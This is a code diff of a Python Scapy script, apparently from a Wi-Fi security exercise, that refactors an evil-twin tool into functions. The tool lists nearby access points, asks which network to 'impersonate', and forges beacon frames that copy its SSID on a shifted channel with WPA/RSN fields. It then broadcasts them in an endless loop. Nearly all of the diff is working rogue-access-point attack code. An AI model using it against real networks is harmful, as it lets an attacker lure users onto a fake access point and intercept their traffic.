@@ -73,51 +73,65 @@ def detectAP():
             t.join(1.0)
 
 
+def select_bssid():
+    """
+    Ask the user to select a bssid in the list
+    :return:  the id selected -1 if list is empty
+    """
+    bssid_index = -1
+    if len(BSSIDs) == 0:
+        return bssid_index
+    while 0 > bssid_index or len(BSSIDs) - 1 < bssid_index:
+        try:
+            bssid_index = int(input(
+                "\nPlease Select the number associated with the network you wish to impersonate [0-{:d}] : ".format(
+                    len(BSSIDs) - 1)))
+        except ValueError:
+            print("Invalid input")
+    return bssid_index
+
+
+def fake_channel(target_packet):
+    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]
+
+    # Set given BSSID or use default
+    dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
+                  addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)
+
+    # Enable authentication in the beacon as we want to spoof an authenticated network.
+    beacon = Dot11Beacon(cap='ESS+privacy')
+
+    essid = Dot11Elt(ID='SSID', info=target_packet.info,
+                     len=len(target_packet.info))
+
+    chn = int(ord(target_packet[Dot11Elt:3].info))
+
+    chn = chn - 6 if chn > 6 else chn + 6
+
+    channel = Dot11Elt(ID='DSset', info=chr(chn))
+
+    # RSN payload taken from https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+    rsn = Dot11Elt(ID='RSNinfo', info=(
+        '\x01\x00'  # RSN Version 1
+        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
+        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
+        '\x00\x0f\xac\x04'  # AES Cipher
+        '\x00\x0f\xac\x02'  # TKIP Cipher
+        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
+        '\x00\x0f\xac\x02'  # Pre-Shared Key
+        '\x00\x00'))  # RSN Capabilities (no extra capabilities)
+
+    frame = RadioTap() / dot11 / beacon / essid / channel / rsn
+
+    frame.show()
+
+    # Infinite loop to continuously sending packets
+    sendp(frame, iface="wlan0mon", inter=0.100, loop=1)
+
+
 detectAP()
-
-# User selection of the BSSID to spoof
-BSSID_Index = -1
-while 0 > BSSID_Index or len(BSSIDs) - 1 < BSSID_Index:
-    try:
-        BSSID_Index = int(input(
-            "\nPlease Select the number associated with the network you wish to impersonate [0-{:d}] : ".format(
-                len(BSSIDs) - 1)))
-    except ValueError:
-        print("Invalid input")
-
-interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]
-
-# Set given BSSID or use default
-dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
-              addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)
-
-# Enable authentication in the beacon as we want to spoof an authenticated network.
-beacon = Dot11Beacon(cap='ESS+privacy')
-
-targetPacket = BSSIDPackets[BSSIDs[BSSID_Index]]
-essid = Dot11Elt(ID='SSID', info=targetPacket.info,
-                 len=len(targetPacket.info))
-
-chn = int(ord(targetPacket[Dot11Elt:3].info))
-
-chn = chn - 6 if chn > 6 else chn + 6
-
-channel = Dot11Elt(ID='DSset', info=chr(chn))
-
-# RSN payload taken from https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
-rsn = Dot11Elt(ID='RSNinfo', info=(
-    '\x01\x00'  # RSN Version 1
-    '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
-    '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
-    '\x00\x0f\xac\x04'  # AES Cipher
-    '\x00\x0f\xac\x02'  # TKIP Cipher
-    '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
-    '\x00\x0f\xac\x02'  # Pre-Shared Key
-    '\x00\x00'))  # RSN Capabilities (no extra capabilities)
-
-frame = RadioTap() / dot11 / beacon / essid / channel / rsn
-
-frame.show()
-
-# Infinite loop to continuously sending packets
-sendp(frame, iface="wlan0mon", inter=0.100, loop=1)
+selected_id = select_bssid()
+if selected_id == -1:
+    print("No AP detected. Exiting...")
+    exit()
+fake_channel(BSSIDPackets[BSSIDs[selected_id]])
